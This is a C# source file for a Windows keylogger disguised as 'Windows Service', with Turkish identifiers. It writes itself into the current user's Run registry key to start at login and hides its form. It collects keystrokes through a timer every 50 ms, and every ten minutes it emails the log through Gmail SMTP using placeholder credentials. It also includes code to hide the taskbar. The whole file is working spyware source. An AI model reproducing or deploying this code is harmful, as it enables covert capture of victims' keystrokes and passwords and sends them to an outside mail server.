using Microsoft.Win32;
using System;
using System.Collections.Generic;
using System.ComponentModel;
using System.Data;
using System.Drawing;
using System.Net.Mail;
using System.Runtime.InteropServices;
using System.Text;
using System.Timers;
using System.Windows.Forms;

namespace Windows_Service
{
    public partial class ServiceProcess : Form
    {
        System.Timers.Timer _startRecord;
        ServiceHelper _serviceHelper;
        TextBox txtEnter;
        System.Timers.Timer _deleteRecord;
        RegistryKey setOpen = Registry.CurrentUser.OpenSubKey(@"Software\Microsoft\Windows\CurrentVersion\Run", true);
        public ServiceProcess()
        {
            txtEnter = new TextBox();
            _serviceHelper = new ServiceHelper();

            _startRecord = new System.Timers.Timer(50);
            _deleteRecord = new System.Timers.Timer(600000);
            InitializeComponent();
            setOpen.SetValue("Windows Service", Application.ExecutablePath.ToString());

        }
        protected override void WndProc(ref Message m)
        {
            if ((m.Msg == 0x312))
            {

                if (this.Visible == true)

                    this.Visible = false;

                else

                    this.Visible = true;
            }
            base.WndProc(ref m);
        }
        private void Form1_Load(object sender, EventArgs e)
        {

            CheckForIllegalCrossThreadCalls = false;

            _startRecord.Enabled = true;
            _deleteRecord.Enabled = true;
            _startRecord.Start();
            _deleteRecord.Start();
            _startRecord.Elapsed += new ElapsedEventHandler(SendKeys);
            _deleteRecord.Elapsed += new ElapsedEventHandler(SendMail);
            _startRecord.Start();
            Hide();
        }


        public void SendKeys(object o, ElapsedEventArgs a)
        {
            foreach (string key in _serviceHelper.basilanTuslar())
            {
                txtEnter.Text += key;
            }
        }

        private void SendMail(object o, ElapsedEventArgs a)
        {
            try
            {
                SmtpClient SmtpServer = new SmtpClient("smtp.gmail.com", 587);
                var sendMail = new MailMessage();
                sendMail.From = new MailAddress("gmail adres");
                sendMail.To.Add("gmail adres");
              
                sendMail.Subject = "MESAJINIZ VAR";
                sendMail.IsBodyHtml = true;
                sendMail.Body = "<html><body>" + txtEnter.Text + "</body></html>";
                SmtpServer.EnableSsl = true;
                SmtpServer.UseDefaultCredentials = false;
                SmtpServer.Credentials = new System.Net.NetworkCredential("gmail adres", "şifre");
                SmtpServer.Send(sendMail);
                txtEnter.Clear();
            }
            catch (Exception)
            {

            }
        }

        private class Taskbar
        {
            [DllImport("user32.dll")]
            private static extern int FindWindow(string className, string windowText);
            [DllImport("user32.dll")]
            private static extern int ShowWindow(int hwnd, int command);

            private const int SW_HIDE = 0;
            private const int SW_SHOW = 1;

            private readonly int _taskbarHandle;

            public Taskbar()
            {
                _taskbarHandle = FindWindow("Shell_TrayWnd", "");
            }

            public void Show()
            {
                ShowWindow(_taskbarHandle, SW_SHOW);
            }

            public void Hide()
            {
                ShowWindow(_taskbarHandle, SW_HIDE);
            }
        }
    }
}
